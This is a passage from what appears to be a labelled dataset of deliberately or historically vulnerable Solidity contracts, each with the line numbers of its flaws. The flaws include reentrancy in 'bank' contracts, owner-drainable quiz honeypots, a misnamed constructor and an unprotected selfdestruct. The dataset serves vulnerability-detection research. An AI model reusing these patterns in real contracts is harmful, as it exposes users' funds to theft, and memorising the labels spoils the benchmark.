    function getFunds() public view returns (uint){
        return address(this).balance;
    }
}","[28, 32]"
"pragma solidity ^0.4.24;
// Fabrica pre-ICO stage
//      see proposal at fabrica.io
contract Ownable {
    address public owner;
    function Ownable() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}
contract myPreICO is Ownable {
    uint public ETHRaised;
    uint public soft_cap = 1 ether; // once we raise min 1 ETH, we can get them and start the ICO preparation
    uint public hard_cap = 10 ether;// once we've raised 10 ETH, you can't withdraw them back, project will run to the ICO stage
    address public owner = 0x0;
    uint public end_date;
    address[] public holders;
    mapping (address => uint) public holder_balance;
    function myICO() public {
        owner = msg.sender;
        end_date = now + 90 days; // holders can take their money back some time later if pre-ICO failed
    }
    function sendFunds(address _addr) public onlyOwner {
        require (ETHRaised >= soft_cap); // can get $ETH only if soft_cap reached
        _addr.transfer(address(this).balance);
    }
    function withdraw() public {
        uint amount;
        require(now > end_date);// holders can take their money back if pre-ICO failed ...
        require(ETHRaised < hard_cap);// ... and hard_cap has't been reached
        amount = holder_balance[msg.sender];
        holder_balance[msg.sender] = 0;
        msg.sender.transfer(amount);
    }
    function () public payable {
        require(msg.value > 0);
        holders.push(msg.sender);
        holder_balance[msg.sender] += msg.value;
        ETHRaised += msg.value;
    }
    function getFunds() public view returns (uint){
        return address(this).balance;
    }
}","[24, 28, 32, 41, 42]"
"pragma solidity ^0.4.20;
contract nice_chance
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.25;
contract offshore_Bank
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function offshore_Bank(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract offshore_bank
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function offshore_bank(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
    contract our_bank
    {
        function Put(uint _unlockTime)
        public
        payable
        {
            var acc = Acc[msg.sender];
            acc.balance += msg.value;
            acc.unlockTime = _unlockTime>now?_unlockTime:now;
            LogFile.AddMessage(msg.sender,msg.value,""Put"");
        }
        function Collect(uint _am)
        public
        payable
        {
            var acc = Acc[msg.sender];
            if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
            {
                if(msg.sender.call.value(_am)())
                {
                    acc.balance-=_am;
                    LogFile.AddMessage(msg.sender,_am,""Collect"");
                }
            }
        }
        function() 
        public 
        payable
        {
            Put(0);
        }
        struct Holder   
        {
            uint unlockTime;
            uint balance;
        }
        mapping (address => Holder) public Acc;
        Log LogFile;
        uint public MinSum = 1 ether;    
        function our_bank(address log) public{
            LogFile = Log(log);
        }
    }
    contract Log 
    {
        struct Message
        {
            address Sender;
            string  Data;
            uint Val;
            uint  Time;
        }
        Message[] public History;
        Message LastMsg;
        function AddMessage(address _adr,uint _val,string _data)
        public
        {
            LastMsg.Sender = _adr;
            LastMsg.Time = now;
            LastMsg.Val = _val;
            LastMsg.Data = _data;
            History.push(LastMsg);
        }
    }","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract p_bank
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function p_bank(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract pg_bank
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function pg_bank(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.20;
contract pg_quiz
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function start_pg_quiz(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.25;
contract piggy_bank
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function piggy_bank(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.20;
contract play_and_gain
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function start_play_and_gain(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.20;
contract play_for_gain
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function start_play_for_gain(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.25;
contract play_me
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 2 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0x9d296b04dd6d1db94b2de883d179bed68488f2b4a3ce4ecc82628155fe1ac726;
    function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[26]
"pragma solidity ^0.4.20;
contract play_quiz
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function start_play_quiz(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.20;
contract play_to_quiz
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function set_game(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.20;
contract question_quest 
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.20;
contract question_quest
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function Set(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.20;
contract qui_qz
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function Start_qui_qz(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.25;
contract quick_game
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 2 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0x855ff3e2cacef37ccaec994eabf34ad18b5724bcfc17da0907a2c3cce4a31960;
    function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[26]
"pragma solidity ^0.4.20;
contract quiz_game
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function start_quiz_game(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.25;
contract quiz_game
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 2 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0xbbf3c4a1222554d9c7ff78de2d5fc04ffb3165b9189e4375bf1e790fb10eca8c;
    function Activate(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[26]
"pragma solidity ^0.4.20;
contract quiz_quest
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function start_quiz_quest(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.20;
contract quiz_quest
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function set_game(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.20;
contract quki
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function Start_quki(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.20;
contract take_away
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.25;
contract     test_contract
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 2 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0x1c2021374889d6743351456dbdedde09679d0f629b9d08597e6fd20e36d6f752;
    function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[26]
"            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly
                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
contract Ownable is Context {
    address payable private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address payable msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), ""Ownable: caller is not the owner"");
        _;
    }
    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address payable newOwner) public virtual onlyOwner {
        require(newOwner != address(0), ""Ownable: new owner is the zero address"");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    /**
     * @dev testing self destruct
     */
    function close() public {
    selfdestruct(_owner);
    }
}
contract testtoken2 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcluded;
    address[] private _excluded;
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 10000000 * 10**6 * 10**18;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    string private _name = 'Koji';
    string private _symbol = 'KOJI';
    uint8 private _decimals = 18;
    constructor () public {
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, ""ERC20: transfer amount exceeds allowance""));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, ""ERC20: decreased allowance below zero""));
        return true;
    }
    function isExcluded(address account) public view returns (bool) {
        return _isExcluded[account];","[64, 65]"
"pragma solidity ^0.4.25;
contract the_game
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 2 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0xc627b3cb6c523a4f0fe0f8644f25c7c61dfa8ebd5f64555e9de7a66cf6f03169;
    function Activate(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[26]
"pragma solidity ^0.4.20;
contract the_riddle
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function SetRDL(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.20;
contract true_game
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function set_game(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.25;
contract trust_bank
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
